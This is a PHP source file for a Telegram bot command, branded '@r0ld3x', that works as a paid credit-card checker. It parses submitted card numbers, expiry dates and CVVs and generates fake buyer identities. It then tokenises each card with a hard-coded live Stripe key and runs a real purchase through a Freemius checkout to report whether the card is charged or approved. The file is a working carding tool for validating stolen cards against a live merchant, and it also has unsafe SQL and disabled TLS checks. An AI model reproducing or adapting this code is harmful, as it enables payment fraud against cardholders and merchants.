<?php
if(strpos($message, '!stc') === 0 or strpos($message, '/stc') === 0 or strpos($message, '.stc') === 0){
exit();
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
    reply_to($chatId,$message_id,$keyboard,$nopre);
    exit();
}elseif(empty($role)){
    reply_to($chatId,$message_id,$keyboard,$noreg);
    exit();
}
sendaction($chatId, typing);
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = preg_replace('/\s/', '|', $lista);
$vaut = array(1,2,6,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
if($client < 5){ 
    reply_to($chatId, $message_id,$keyboard,$nocredits);
    exit();
}elseif(empty($client)){
    reply_to($chatId, $message_id,$keyboard,$noregister);
    exit();
}

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");    
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if($role == 'MEMBER' and $sec < 30){
    $after = 30 - $sec;
    $antispam = urlencode("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
    reply_to($chatId,$message_id,$keyboard,$antispam);
    exit();
    }
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ????? 0%[??] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
$che = bannedbin($bin);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>?BIN BANNED</b>");
    exit();
    }
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ¦¦??? 40%[??] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://checkout.freemius.com/action/service/cart/');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: checkout.freemius.com',
'accept: application/json, text/javascript',
'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile DuckDuckGo/5 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'origin: https://checkout.freemius.com',
'x-requested-with: com.duckduckgo.mobile.android',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://checkout.freemius.com/?mode=dialog&guid=f5af0f0b-b2b0-2221-513d-b7f11cb758e6&plugin_id=8BQAzQwVETtFWGmAFZjAwNSYA7M4EczfocpPa2kZ6AiC1tVQuAhJTRjLG5Nkk4QqFWHxiKBdi6RuUFjC5zMhvhUyK7tatMA%3A%2F%2Fthemegrill.com%2Fwp-content%2Fuploads%2F2020%2F11%2Flogo-spacious-square.jpg&coupon=TGSAVE&name=Spacious&licenses=1',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mode":"dialog","plugin_id":"4225","plan_id":"11250","pricing_id":"12461","is_trial":false,"billing_cycle":12,"email":"'.$email.'","payment_method":"cc","vat_id":null,"country_code":"IN","coupon_id":"33232","coupon_code":"TGSAVE","url":"https://themegrill.com/spacious-pricing/","prev_url":"https://checkout.freemius.com/?mode=dialog&guid=f5af0f0b-b2b0-2221-513d-b7f11cb758e6&plugin_id=8BQAzQwVETtFWGmAFZjAwNSYA7M4EczfocpPa2kZ6AiC1tVQuAhJTRjLG5Nkk4QqFWHxiKBdi6RuUFjC5zMhvhUyK7tatMA%3A%2F%2Fthemegrill.com%2Fwp-content%2Fuploads%2F2020%2F11%2Flogo-spacious-square.jpg&coupon=TGSAVE&name=Spacious&licenses=1#!#https:%2F%2Fthemegrill.com%2Fspacious-pricing%2F"}');
    $result = curl_exec($ch);
    $pubpk = trim(strip_tags(getStr($result,"public_key&quot;:&quot;","&quot;,")));
    $pro = file_put_contents($result, 'test.txt');
// &quot;:&quot;pk_904341c57f3984150672758649147&quot;,&q
    // $cap1 = json_decode($result, true);
    // $id = $cap1['id'];
    sendMessage1($pubpk);
curl_close($ch);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ¦¦¦?? 60%[??] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'accept-language: en-US',
'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile DuckDuckGo/5 Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=239706&guid=NA&muid=NA&sid=NA&key=pk_live_eP8c8rXxkvgPXGLfBw2wjX4p&payment_user_agent=stripe.js%2F7315d41&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[address_zip]=10080&card[address_country]=US&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
    $result = curl_exec($ch);
    $cap1 = json_decode($result, true);
    $id = $cap1['id'];
    // sendMessage1($result);
curl_close($ch);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ¦¦¦¦? 80%[??] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (!empty($id)){
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://checkout.freemius.com/action/service/subscribe/');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: checkout.freemius.com',
'accept: application/json, text/javascript',
'content-type: application/json; charset=UTF-8',
'origin: https://checkout.freemius.com',
'x-requested-with: com.duckduckgo.mobile.android',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://checkout.freemius.com/?mode=dialog&guid=f5af0f0b-b2b0-2221-513d-b7f11cb758e6&plugin_id=8BQAzQwVETtFWGmAFZjAwNSYA7M4EczfocpPa2kZ6AiC1tVQuAhJTRjLG5Nkk4QqFWHxiKBdi6RuUFjC5zMhvhUyK7tatMA%3A%2F%2Fthemegrill.com%2Fwp-content%2Fuploads%2F2020%2F11%2Flogo-spacious-square.jpg&coupon=TGSAVE&name=Spacious&licenses=1',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
    'user-agent: Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile DuckDuckGo/5 Safari/537.36'
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"user_firstname":"'.$first.'","user_lastname":"'.$last.'","user_email":"'.$email.'","update_license":false,"user_phone":"+91'.$phone.'","cart_id":"8BQAzQwVETtFWGmAFZjAwNSYA7M4EczfocpPa2kZ6AiC1tVQuAhJTRjLG5Nkk4QqFWHxiKBdi6RuUFjC5zMhvhUyK7tatMA","billing_cycle":"annual","payment_method":"cc","country_code":"IN","auto_install":false,"coupon":"TGSAVE","coupon_id":33232,"is_marketing_allowed":true,"is_affiliation_enabled":true,"is_sandbox":false,"failed_zipcode_purchases_count":0,"payment_token":"'.$id.'","prev_url":"https://checkout.freemius.com/?mode=dialog&guid=f5af0f0b-b2b0-2221-513d-b7f11cb758e6&plugin_id=8BQAzQwVETtFWGmAFZjAwNSYA7M4EczfocpPa2kZ6AiC1tVQuAhJTRjLG5Nkk4QqFWHxiKBdi6RuUFjC5zMhvhUyK7tatMA%3A%2F%2Fthemegrill.com%2Fwp-content%2Fuploads%2F2020%2F11%2Flogo-spacious-square.jpg&coupon=TGSAVE&name=Spacious&licenses=1#!#https:%2F%2Fthemegrill.com%2Fspacious-pricing%2F"}');
$result = curl_exec($ch);
    $cap1 = json_decode($result, true);
    if(strpos($result, 'Decline code')){
    $ccc = trim(strip_tags(getStr($result,"Decline code: '","'")));
    }elseif(!strpos($result, 'Decline.code') and strpos($result, 'security code is incorrect')){
    $ccc = 'Approved?';
    }elseif(empty($ccc)){
    $ccc = 'Declined ?';
    }
    if (!strpos($result, 'Decline code')){
    $res = $cap1["msg"];
    }elseif(strpos($result, 'Decline code')){
    $res = trim(strip_tags(getStr($result,'msg":"',' D')));
    }elseif(empty($res)){
    $res = 'DECLINED?';
    }
curl_close($ch);
}
sendMessage1($result);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ¦¦¦¦¦ 100%[??] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
if (strpos($result, 'state": "Succeeded')){
  $status = 'Succeeded?';
  $cc_code = "Charged 4$";
  cvv($list);
}elseif (strpos($result, 'status": "Succeeded')) {
  $status = 'Succeeded?';
  $cc_code = "Charged 4$";
  cvv($list);
}elseif (!strpos($result, 'success":false')) {
  $status = 'Succeeded?';
  $cc_code = "Approved";
  cvv($list);
}elseif (strpos($result, 'Succeeded')) {
  $status = 'Succeeded?';
  $cc_code = "Charged 4$";
  cvv($list);
}elseif (strpos($result, 'requires_action')) {
  $status = 'Approved?';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'redirect_to_url')) {
  $status = 'Approved?';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'requires_payment_method')) {
  $status = 'Approved?';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'payment_failed')) {
  $status = 'Falied?';
  $cc_code = "Payment failed";
  cvv($list);
}elseif (strpos($result, '"cvc_check": "pass"')) {
  $status = 'Approved?';
  $cc_code = 'CVC PASS';
  rest($list);
}elseif (strpos($result1, '"cvc_check": "pass"')) {
  $status = 'Approved?';
  $cc_code = 'CVV PASS';
  cvv($list);
}
if(empty($ccc) and !empty($res)){
    $ccc = 'Card declined';
}
if(!empty($ccc)){
    $status = $ccc;
}if(!empty($res)){
    $cc_code = $res;
}if(!empty($code)){
    $code = $code;
}elseif(empty($code)){
    $code = 'none';
}

if(empty($result)){
$result = urlencode("<b>
GATE --> STRIPE - CHARGE 3USD
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Unknown error
Message ->> Check again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[$role]
Credit Left ->> ${balance}??
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}


$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
    $balance = $client - 5;

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
    $result = mysqli_query($link, $sql);
mysqli_close($link);
$result = urlencode("<b>
GATE --> <i>STRIPE - CHARGE 59USD</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Credit Left ->> ${balance}??
Bot By --> <code>@r0ld3x</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>